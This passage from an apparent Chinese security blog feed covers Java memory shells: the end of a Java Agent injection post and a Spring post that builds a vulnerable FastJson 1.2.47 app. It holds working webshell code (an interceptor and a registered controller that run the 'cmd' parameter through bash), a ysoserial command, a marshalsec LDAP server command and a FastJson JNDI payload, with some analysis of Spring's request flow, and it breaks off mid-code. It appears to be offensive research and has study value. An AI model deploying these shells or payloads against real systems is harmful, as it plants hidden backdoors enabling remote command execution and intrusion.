..."</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">        Object o = list.get(i);</span><br><span class="line">        java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">"displayName"</span>,<span class="keyword">null</span>);</span><br><span class="line">        java.lang.String name = (java.lang.String) displayName.invoke(o,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 列出当前有哪些 JVM 进程在运行 </span></span><br><span class="line">        <span class="comment">// 这里的 if 条件根据实际情况进行更改</span></span><br><span class="line">        <span class="keyword">if</span> (name.contains(<span class="string">"com.example.agentmemoryshell.AgentMemoryShellApplication"</span>))&#123;</span><br><span class="line">            <span class="comment">// 获取对应进程的 pid 号</span></span><br><span class="line">            java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">"id"</span>,<span class="keyword">null</span>);</span><br><span class="line">            java.lang.String id = (java.lang.String) getId.invoke(o,<span class="keyword">null</span>);</span><br><span class="line">            System.out.println(<span class="string">"id &gt;&gt;&gt; "</span> + id);</span><br><span class="line">            java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod(<span class="string">"attach"</span>,<span class="keyword">new</span> Class[]&#123;java.lang.String<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            java.lang.Object vm = attach.invoke(o,<span class="keyword">new</span> Object[]&#123;id&#125;);</span><br><span class="line">            java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod(<span class="string">"loadAgent"</span>,<span class="keyword">new</span> Class[]&#123;java.lang.String<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            loadAgent.invoke(vm,<span class="keyword">new</span> Object[]&#123;path&#125;);</span><br><span class="line">            java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod(<span class="string">"detach"</span>,<span class="keyword">null</span>);</span><br><span class="line">            detach.invoke(vm,<span class="keyword">null</span>);</span><br><span class="line">            System.out.println(<span class="string">"Agent.jar Inject Success !!"</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成yso payload打过去即可，注意这里选择CommonsCollections11</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar CommonsCollections11 codefile:./agent.java | base64</span><br></pre></td></tr></table></figure><p><img src="/2022/05/26/Java-10/96tVzJzR83kkeNYB5OU-SnIdFGHcbh0D-6DKok0OmhU.png" alt="image"></p><h2 id="Refferences"><a href="#Refferences" class="headerlink" title="Refferences"></a>Refferences</h2><ul><li><a href="https://www.freebuf.com/articles/web/172753.html" target="_blank" rel="noopener">利用“进程注入”实现无文件复活 WebShell</a></li><li><a href="http://wjlshare.com/archives/1582" target="_blank" rel="noopener">浅谈 Java Agent 内存马 – 天下大木头</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Java-Agent&quot;&gt;&lt;a href=&quot;#Java-Agent&quot; class=&quot;headerlink&quot; title=&quot;Java Agent&quot;&gt;&lt;/a&gt;Java Agent&lt;/h2&gt;&lt;p&gt;在 jdk 1.5 之后引入了 java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题，&lt;strong&gt;通过 java.lang.instrument 实现的工具我们称之为 Java Agent&lt;/strong&gt; ，Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法&lt;/p&gt;
&lt;p&gt;Agent 内存马的实现就是利用了这一特性使其动态修改特定类的特定方法，将我们的恶意方法添加进去&lt;/p&gt;
&lt;p&gt;说白了 Java Agent 只是一个 Java 类而已，只不过普通的 Java 类是以 main 函数作为入口点的，Java Agent 的入口点则是 premain 和 agentmain&lt;/p&gt;
&lt;p&gt;Java Agent 支持两种方式进行加载：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;实现 premain 方法，在启动时进行加载 （该特性在 jdk 1.5 之后才有）&lt;/li&gt;
&lt;li&gt;实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有）&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
    
      <category term="Java" scheme="https://jlkl.github.io/tags/Java/"/>
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Spring Memory Shell</title>
    <link href="https://jlkl.github.io/2022/05/26/Java-09/"/>
    <id>https://jlkl.github.io/2022/05/26/Java-09/</id>
    <published>2022-05-26T01:41:12.000Z</published>
    <updated>2022-05-26T01:48:21.018Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Interceptor-Memory-Shell"><a href="#Interceptor-Memory-Shell" class="headerlink" title="Interceptor Memory Shell"></a>Interceptor Memory Shell</h2><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>JDK 1.8.0_20，采用FastJson 1.2.47的RCE来创造反序列化漏洞利用点</p><p>创建springboot项目</p><p><img src="/2022/05/26/Java-09/9kJm5LG_ftZ8GMt5iJHY4At-xMh3DIlyi5d5EIiNJ80.png" alt="image"></p><a id="more"></a><p>这里先用2.5.13老版本springboot举例，勾选web</p><p><img src="/2022/05/26/Java-09/w05zwFRKb-uhnyZtGu0hzixUOcp1TYdzkxI2OIhzWRM.png" alt="image"></p><p>pom.xml，添加fastjson依赖</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.47&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>创建存在漏洞的controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springmemoryshell.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">vuln</span><span class="params">(@RequestParam String content)</span> </span>&#123;</span><br><span class="line">        JSON.parse(content);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建恶意代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//package bitterz.interceptors;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.HandlerInterceptorAdapter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InjectToInterceptor</span> <span class="keyword">extends</span> <span class="title">HandlerInterceptorAdapter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InjectToInterceptor</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, InstantiationException </span>&#123;</span><br><span class="line"><span class="comment">//        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);</span></span><br><span class="line"><span class="comment">//        System.out.println("get context success");</span></span><br><span class="line"><span class="comment">//        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");</span></span><br><span class="line"><span class="comment">//        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");</span></span><br><span class="line"><span class="comment">//        field.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        System.out.println("get field success");</span></span><br><span class="line"><span class="comment">//        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span></span><br><span class="line">        <span class="comment">//获得context</span></span><br><span class="line">        WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">//获取 adaptedInterceptors 属性值</span></span><br><span class="line">        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="string">"requestMappingHandlerMapping"</span>);</span><br><span class="line">        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br><span class="line">        <span class="comment">// 避免重复添加</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = adaptedInterceptors.size() - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (adaptedInterceptors.get(i) <span class="keyword">instanceof</span> InjectToInterceptor) &#123;</span><br><span class="line">                System.out.println(<span class="string">"已经添加过TestInterceptor实例了"</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        InjectToInterceptor aaa = <span class="keyword">new</span> InjectToInterceptor(<span class="string">"aaa"</span>);  <span class="comment">// 避免进入实例创建的死循环</span></span><br><span class="line">        adaptedInterceptors.add(aaa);  <span class="comment">//  添加全局interceptor</span></span><br><span class="line">        System.out.println(<span class="string">"添加成功"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InjectToInterceptor</span><span class="params">(String aaa)</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String code = request.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">        <span class="keyword">if</span> (code != <span class="keyword">null</span>) &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(code);</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            Process process = <span class="keyword">new</span> ProcessBuilder(<span class="string">"bash"</span>,<span class="string">"-c"</span>,request.getParameter(<span class="string">"cmd"</span>)).start();</span><br><span class="line">            <span class="keyword">int</span> len = process.getInputStream().read(bytes);</span><br><span class="line">            PrintWriter writer = response.getWriter();</span><br><span class="line">            writer.write(<span class="keyword">new</span> String(bytes,<span class="number">0</span>,len));</span><br><span class="line">            writer.flush();</span><br><span class="line">            writer.close();</span><br><span class="line">            process.destroy();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//            response.sendError(404);</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>启动恶意LDAP服务，在8090开启web服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="comment">//127.0.0.1:8090/#InjectToInterceptor</span></span><br></pre></td></tr></table></figure><p>直接向vuln路由打fastjson payload，注入Interceptor内存马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">content=&#123;</span><br><span class="line">    <span class="string">"a"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="string">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"b"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="string">"dataSourceName"</span>:<span class="string">"ldap://127.0.0.1:1389/#InjectToInterceptor"</span>,</span><br><span class="line">        <span class="string">"autoCommit"</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注入成功</p><p><img src="/2022/05/26/Java-09/ZLQbvG97FOjPHtOHi15d1JCMD9drSe1OaXnJ8gS0RcI.png" alt="image"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在任意controller下断点分析springboot的处理流程可以看到这里和tomcat的处理流程很像</p><p><img src="/2022/05/26/Java-09/K2x7P9So64z1KQ3FtfVwCR71Ts2wJI_2e6RvUPTwt68.png" alt="image"></p><p>在经过 Filter 层面处理后，就会进入熟悉的 <code>spring-webmvc</code> 组件 <code>org.springframework.web.servlet.DispatcherServlet</code> 类的 <code>doDispatch</code> 方法中</p><p><img src="/2022/05/26/Java-09/kXtQmOEeVyS5J3_kJHS6-oL9HxBVwVhoCXAvbAuK_sI.png" alt="image"></p><p>调用getHandler方法，跟进，可以看到是遍历<code>this.handlerMappings</code> 这个迭代器中的<code>mapper</code>的<code>getHandler</code> 方法处理Http中的request请求</p><p><img src="/2022/05/26/Java-09/iXkDIAR3imj-QXDtT_4hhKfuaNSwHjM791AGBXt_SBM.png" alt="image"></p><p>继续追踪，最终会调用到<code>org.springframework.web.servlet.handler.AbstractHandlerMapping</code> 类的 <code>getHandler</code> 方法，并通过 <code>getHandlerExecutionChain(handler, request)</code> 方法返回 <code>HandlerExecutionChain</code> 类的实例</p><p><img src="/2022/05/26/Java-09/d74pNKukY1FyNVJu8IEBRuI2nDcEjtJ1yuNQeWNVcGQ.png" alt="image"></p><p>继续跟进<code>getHandlerExecutionChain</code> 方法，会遍历 <code>this.adaptedInterceptors</code> 对象里所有的 <code>HandlerInterceptor</code> 类实例，通过 <code>chain.addInterceptor</code> 把已有的所有拦截器加入到需要返回的 <code>HandlerExecutionChain</code> 类实例中</p><p><img src="/2022/05/26/Java-09/alNQYIM706n0lDkpneZSfDofB_242dnF4b5M4dSIs6U.png" alt="image"></p><p>回到<code>org.springframework.web.servlet.DispatcherServlet</code> 类的 <code>doDispatch</code> 方法中，调用applyPreHandle方法</p><p><img src="/2022/05/26/Java-09/L9JR0dtTBo5rkIEMxTEpeQmcghK6S6Z67bxtIGOPIhs.png" alt="image"></p><p>这里<code>AbstractHandlerMapping</code> 类的applyPreHandle方法，会遍历拦截器，并执行其<code>preHandle</code>方法</p><p><img src="/2022/05/26/Java-09/KIY5zLCYJ9q9v87IeJ0h8GMAsvBQBQ84qpSCKkuOBw8.png" alt="image"></p><p>之后的话看整体逻辑，执行了handler之后才会执行到controller，即Interceptor在controller之前</p><p><img src="/2022/05/26/Java-09/Ty_uB05sZUReYCP3by5HcJdnutlAx2FlJR2upph8oxA.png" alt="image"></p><p>如果程序提前在调用的 <code>Controller</code> 上设置了 <code>Aspect</code>（切面），那么在正式调用 <code>Controller</code> 前实际上会先调用切面的代码，一定程度上也起到了 “拦截” 的效果</p><p>那么总结一下，一个 request 发送到 spring 应用，大概会经过以下几个层面才会到达处理业务逻辑的 Controller 层：</p><figure class="highlight plain"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HttpRequest --&gt; Filter --&gt; DispactherServlet --&gt; Interceptor --&gt; Aspect --&gt; Controller</span><br></pre></td></tr></table></figure><p>由上面的分析，会遍历 <code>this.adaptedInterceptors</code> 对象里所有的 <code>HandlerInterceptor</code> 类实例，通过 <code>chain.addInterceptor</code> 把已有的所有拦截器加入到需要返回的 <code>HandlerExecutionChain</code> 类实例中</p><p><code>HandlerInterceptor</code> 这个接口要求实现preHandle函数，<code>Interceptor</code> 最后的处理也是调用preHandle函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.springframework.web.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.lang.Nullable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通过context.getBean(“org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping”)获取该对象，再反射获取其中的adaptedInterceptors属性，并添加恶意interceptor实例对象即可完成内存马的注入</p><h2 id="Controller-Memory-Shell"><a href="#Controller-Memory-Shell" class="headerlink" title="Controller Memory Shell"></a>Controller Memory Shell</h2><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>创建恶意代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span>  <span class="title">InjectToController</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InjectToController</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 关于获取Context的方式有多种</span></span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.</span><br><span class="line">                currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br><span class="line">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Method method = Class.forName(<span class="string">"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping"</span>).getDeclaredMethod(<span class="string">"getMappingRegistry"</span>);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 通过反射获得该类的test方法</span></span><br><span class="line">        Method method2 = InjectToController.class.getMethod("test");</span><br><span class="line">        <span class="comment">// 定义该controller的path</span></span><br><span class="line">        PatternsRequestCondition url = <span class="keyword">new</span> PatternsRequestCondition(<span class="string">"/str3am"</span>);</span><br><span class="line">        <span class="comment">// 定义允许访问的HTTP方法</span></span><br><span class="line">        RequestMethodsRequestCondition ms = <span class="keyword">new</span> RequestMethodsRequestCondition();</span><br><span class="line">        <span class="comment">// 构造注册信息</span></span><br><span class="line">        <span class="comment">//RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);</span></span><br><span class="line">        Class&lt;?&gt; class1 = Class.forName(<span class="string">"org.springframework.web.servlet.mvc.method.RequestMappingInfo"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Get RequestMappingInfo Success!"</span>);</span><br><span class="line">        RequestMappingInfo info = (RequestMappingInfo)class1.getDeclaredConstructor(PatternsRequestCondition<span class="class">.<span class="keyword">class</span>, <span class="title">RequestMethodsRequestCondition</span>.<span class="title">class</span>, <span class="title">ParamsRequestCondition</span>.<span class="title">class</span>, <span class="title">HeadersRequestCondition</span>.<span class="title">class</span>, <span class="title">ConsumesRequestCondition</span>.<span class="title">class</span>, <span class="title">ProducesRequestCondition</span>.<span class="title">class</span>, <span class="title">RequestCondition</span>.<span class="title">class</span>).<span class="title">newInstance</span>(<span class="title">url</span>,<span class="title">ms</span>,<span class="title">null</span>,<span class="title">null</span>,<span class="title">null</span>,<span class="title">null</span>,<span class="title">null</span>)</span>;</span><br><span class="line">        <span class="comment">// 创建用于处理请求的对象，避免无限循环使用另一个构造方法</span></span><br><span class="line">        InjectToController injectToController = <span class="keyword">new</span> InjectToController(<span class="string">"aaa"</span>);</span><br><span class="line">        <span class="comment">// 将该controller注册到Spring容器</span></span><br><span class="line">        mappingHandlerMapping.registerMapping(info, injectToController, method2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InjectToController</span><span class="params">(String aaa)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 获取请求</span></span><br><span class="line">        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        <span class="comment">// 获取请求的参数cmd并执行</span></span><br><span class="line">        <span class="comment">// 类似于PHP的system($_GET["cmd"])</span></span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(request.getParameter("cmd"));</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span 